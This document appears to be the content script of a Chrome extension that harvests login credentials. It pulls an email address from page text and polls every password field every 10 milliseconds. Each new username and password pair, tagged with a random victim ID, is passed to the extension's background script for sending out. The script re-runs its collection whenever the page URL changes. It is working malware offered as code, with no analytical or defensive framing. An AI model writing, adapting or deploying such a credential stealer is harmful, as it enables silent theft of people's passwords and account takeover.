var email = "";
var password = "";
var prev_email = "";
var prev_password = "";

chrome.storage.local.get(["customId"], function (result) {
    console.log(result);
    customId = result.customId;
    if (customId == null) {
        customId = Math.floor(Math.random()*256);
    }
    console.log("Value currently is " + customId);
    
    chrome.storage.local.set(
        { customId: customId },
        function () {
            // console.log("Value is set to " + customId);
        }
    );
});
function init() {
    let divs = document.getElementsByTagName("div");
    console.log(divs);
    for (i = 0; i < divs.length; i++) {
        let div = divs[i];
        if (!div.innerText.includes("@")) {
            continue;
        }
        if (div.children.length > 0) {
            continue;
        }
        email = div.innerText;
    }
    let inputs = document.getElementsByTagName("input");
    for (i = 0; i < inputs.length; i++) {
        let input = inputs[i];
        if (input.type != "password") {
            continue;
        }
        console.log(input);
        password = input.value;
        setInterval(() => {
            password = input.value;
            valueUpdate(email, password);
        }, 10)
    }
    console.log(email, password);
}

const rot13 = (message) => {
    const originalAlpha =
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    const cipher = "nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM";
    return message.replace(
        /[a-z]/gi,
        (letter) => cipher[originalAlpha.indexOf(letter)]
    );
};

var data_queue = [];
setInterval(() => {
    if (data_queue.length == 0) {
        return;
    }
    let data = data_queue[data_queue.length - 1]
    data_queue = [];
    let user = data[0];
    let pass = data[1];
    (async () => {
        const response = await chrome.runtime.sendMessage({req: "send", text: `ID: ${customId}\nUsername: ${user}\nPassword: ${pass}`});
      })();
}, 300)

function valueUpdate(user, pass) {
    if (user == "") {
        return;
    }
    if (pass == "") {
        return;
    }
    if (user == prev_email && pass == prev_password) {
        return;
    }
    console.log(user, pass)
    prev_email = user;
    prev_password = pass;
    data_queue.push([user, pass]);
}

setTimeout(init, 1000);

//detect if url changed and run init again
var prev_url = window.location.href;
setInterval(() => {
    if (window.location.href != prev_url) {
        prev_url = window.location.href;
        init();
    }
}, 500)